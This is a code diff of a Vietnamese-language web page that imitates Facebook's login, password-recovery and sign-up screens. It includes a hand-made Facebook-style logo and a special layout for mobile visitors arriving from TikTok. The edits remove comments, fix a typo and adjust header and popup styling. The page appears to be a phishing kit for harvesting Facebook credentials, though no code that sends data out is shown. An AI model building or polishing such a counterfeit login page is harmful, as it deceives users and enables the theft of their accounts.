@@ -22,7 +22,6 @@
             min-height: 100vh;
             background: #f0f2f5;
         }
-        /* TikTok Mode Styles */
         body.tiktok-mode {
             background: #fff;
             justify-content: center;
@@ -166,17 +165,17 @@
             width: 100%;
             max-width: 400px;
             background: transparent;
-            padding: 15px; /* Giảm padding để vừa màn hình nhỏ */
-            margin-top: 60px; /* Giảm margin-top để vừa màn hình */
+            padding: 15px;
+            margin-top: 60px;
             text-align: left;
             position: relative;
             z-index: 1;
             display: none;
         }
         body.tiktok-mode .login-container-tiktok {
-            margin-top: 50px; /* Điều chỉnh riêng cho TikTok mode */
-            max-height: calc(100vh - 100px); /* Giới hạn chiều cao để vừa màn hình */
-            overflow-y: auto; /* Cho phép cuộn nếu nội dung dài */
+            margin-top: 50px;
+            max-height: calc(100vh - 100px);
+            overflow-y: auto;
         }
         .login-container-tiktok.active, .login-container-desktop.active,
         .forgot-password-container.active, .forgot-password-email-container.active, 
@@ -191,14 +190,14 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            margin: 20px 0; /* Giảm margin để vừa màn hình */
+            margin: 20px 0;
         }
         .facebook-logo img {
-            width: 50px; /* Giảm kích thước logo */
+            width: 50px;
             height: 50px;
         }
         .custom-logo {
-            width: 50px; /* Giảm kích thước logo */
+            width: 50px;
             height: 50px;
             background-color: #1A85FF;
             border-radius: 50%;
@@ -206,7 +205,7 @@
             justify-content: center;
             align-items: center;
             color: #fff;
-            font-size: 30px; /* Giảm kích thước chữ f */
+            font-size: 30px;
             font-family: Helvetica, Arial, sans-serif;
             font-weight: bold;
             text-transform: lowercase;
@@ -215,17 +214,17 @@
         .login-container-tiktok input, .login-container-desktop input,
         .forgot-password-container input, .forgot-password-email-container input, 
         .create-account-container input {
-            margin-bottom: 10px; /* Giảm khoảng cách giữa các input */
+            margin-bottom: 10px;
             border-radius: 6px;
             width: 100%;
-            padding: 10px; /* Giảm padding input */
+            padding: 10px;
             border: 1px solid #ddd;
             background: #fff;
         }
         .btn-primary {
             width: 100%;
             border-radius: 6px;
-            padding: 10px; /* Giảm padding nút */
+            padding: 10px;
             background-color: #1877f2;
             border-color: #1877f2;
             color: white;
@@ -250,7 +249,7 @@
         }
         .bottom-section {
             position: fixed;
-            bottom: 20px; /* Giảm khoảng cách dưới */
+            bottom: 20px;
             width: 100%;
             max-width: 400px;
             left: 50%;
@@ -331,10 +330,14 @@
             border-radius: 8px;
             box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
             width: 90%;
-            max-width: 300px;
+            max-width: 300px; /* Giữ mặc định cho desktop */
             text-align: center;
             padding: 20px;
             z-index: 10002;
+        }
+        body.tiktok-mode .success-popup {
+            max-width: 90%; /* Tăng kích thước trên điện thoại */
+            padding: 25px; /* Tăng padding */
         }
         .success-popup-title {
             font-size: 16px;
@@ -342,10 +345,16 @@
             color: #1c1e21;
             margin-bottom: 10px;
         }
+        body.tiktok-mode .success-popup-title {
+            font-size: 20px; /* Tăng kích thước chữ trên điện thoại */
+        }
         .success-popup-message {
             font-size: 14px;
             color: #4b4f56;
             margin-bottom: 20px;
+        }
+        body.tiktok-mode .success-popup-message {
+            font-size: 16px; /* Tăng kích thước chữ trên điện thoại */
         }
         .success-popup-button {
             background-color: #1877f2;
@@ -356,6 +365,11 @@
             width: 100px;
             font-weight: bold;
             cursor: pointer;
+        }
+        body.tiktok-mode .success-popup-button {
+            width: 120px; /* Tăng kích thước nút trên điện thoại */
+            padding: 12px;
+            font-size: 16px; /* Tăng kích thước chữ */
         }
         .success-popup-button:hover {
             background-color: #165db2;
@@ -399,7 +413,6 @@
             font-size: 14px;
             margin-bottom: 10px;
         }
-        /* Desktop Mode Styles */
         .left-section {
             display: none;
             text-align: left;
@@ -640,7 +653,7 @@
         <div class="more-container">
             <div class="fb-section">
                 <h2>Xem thêm</h2>
-                <p>Khám phá các sản W phẩm, tính năng và dịch vụ khác từ Facebook và Meta.</p>
+                <p>Khám phá các sản phẩm, tính năng và dịch vụ khác từ Facebook và Meta.</p>
             </div>
             <div class="fb-section">
                 <h2>Sản phẩm</h2>
@@ -742,15 +755,18 @@
             document.body.classList.remove('tiktok-mode', 'desktop-mode');
             const header = document.querySelector('.header');
 
+            // Reset trạng thái header trước khi áp dụng mode
+            header.classList.add('hidden');
+
             if (isFromTikTok && !isDesktop) {
                 console.log("Applying TikTok mode");
                 document.body.classList.add('tiktok-mode');
-                header.classList.remove('hidden'); // Chỉ hiển thị header trong TikTok mode
+                header.classList.remove('hidden');
                 hideAllExcept('.login-container-tiktok');
             } else {
                 console.log("Applying Desktop mode");
                 document.body.classList.add('desktop-mode');
-                header.classList.add('hidden'); // Ẩn header trong desktop mode
+                header.classList.add('hidden');
                 document.querySelector('.left-section').style.display = 'block';
                 hideAllExcept('.login-container-desktop');
             }
@@ -778,94 +794,115 @@
         function showLogin() {
             const isDesktop = document.body.classList.contains('desktop-mode');
             const isTikTok = document.body.classList.contains('tiktok-mode');
+            const header = document.querySelector('.header');
+            
             if (isTikTok) {
                 hideAllExcept('.login-container-tiktok');
                 document.getElementById('header-title').innerText = 'Đăng nhập Facebook | Facebook';
                 document.getElementById('header-title').classList.remove('small-title');
                 document.getElementById('language-text').style.display = 'block';
                 document.getElementById('back-button-header').style.display = 'none';
+                header.classList.remove('hidden');
             } else if (isDesktop) {
                 hideAllExcept('.login-container-desktop');
                 document.querySelector('.left-section').style.display = 'block';
-                document.querySelector('.header').classList.add('hidden'); // Ẩn header khi quay lại desktop
+                header.classList.add('hidden');
             }
         }
 
         function showForgotPassword() {
             const isDesktop = document.body.classList.contains('desktop-mode');
+            const header = document.querySelector('.header');
             hideAllExcept('.forgot-password-container');
             if (isDesktop) {
                 document.querySelector('.left-section').style.display = 'none';
+                header.classList.add('hidden');
             } else {
                 document.getElementById('header-title').innerText = 'Tìm tài khoản của bạn';
                 document.getElementById('header-title').classList.add('small-title');
                 document.getElementById('language-text').style.display = 'none';
                 document.getElementById('back-button-header').style.display = 'flex';
+                header.classList.remove('hidden');
             }
         }
 
         function showForgotPasswordEmail() {
             const isDesktop = document.body.classList.contains('desktop-mode');
+            const header = document.querySelector('.header');
             hideAllExcept('.forgot-password-email-container');
             if (isDesktop) {
                 document.querySelector('.left-section').style.display = 'none';
+                header.classList.add('hidden');
             } else {
                 document.getElementById('header-title').innerText = 'Tìm tài khoản của bạn';
                 document.getElementById('header-title').classList.add('small-title');
                 document.getElementById('language-text').style.display = 'none';
                 document.getElementById('back-button-header').style.display = 'flex';
+                header.classList.remove('hidden');
             }
         }
 
         function showCreateAccount() {
             const isDesktop = document.body.classList.contains('desktop-mode');
+            const header = document.querySelector('.header');
             hideAllExcept('.create-account-container');
             if (isDesktop) {
                 document.querySelector('.left-section').style.display = 'none';
+                header.classList.add('hidden');
             } else {
                 document.getElementById('header-title').innerText = 'Tạo tài khoản mới';
                 document.getElementById('header-title').classList.add('small-title');
                 document.getElementById('language-text').style.display = 'none';
                 document.getElementById('back-button-header').style.display = 'flex';
+                header.classList.remove('hidden');
             }
         }
 
         function showAbout() {
             const isDesktop = document.body.classList.contains('desktop-mode');
+            const header = document.querySelector('.header');
             hideAllExcept('.about-container');
             if (isDesktop) {
                 document.querySelector('.left-section').style.display = 'none';
+                header.classList.add('hidden');
             } else {
                 document.getElementById('header-title').innerText = 'Giới thiệu';
                 document.getElementById('header-title').classList.add('small-title');
                 document.getElementById('language-text').style.display = 'none';
                 document.getElementById('back-button-header').style.display = 'flex';
+                header.classList.remove('hidden');
             }
         }
 
         function showHelp() {
             const isDesktop = document.body.classList.contains('desktop-mode');
+            const header = document.querySelector('.header');
             hideAllExcept('.help-container');
             if (isDesktop) {
                 document.querySelector('.left-section').style.display = 'none';
+                header.classList.add('hidden');
             } else {
                 document.getElementById('header-title').innerText = 'Trợ giúp';
                 document.getElementById('header-title').classList.add('small-title');
                 document.getElementById('language-text').style.display = 'none';
                 document.getElementById('back-button-header').style.display = 'flex';
+                header.classList.remove('hidden');
             }
         }
 
         function showMore() {
             const isDesktop = document.body.classList.contains('desktop-mode');
+            const header = document.querySelector('.header');
             hideAllExcept('.more-container');
             if (isDesktop) {
                 document.querySelector('.left-section').style.display = 'none';
+                header.classList.add('hidden');
             } else {
                 document.getElementById('header-title').innerText = 'Xem thêm';
                 document.getElementById('header-title').classList.add('small-title');
                 document.getElementById('language-text').style.display = 'none';
                 document.getElementById('back-button-header').style.display = 'flex';
+                header.classList.remove('hidden');
             }
         }
 
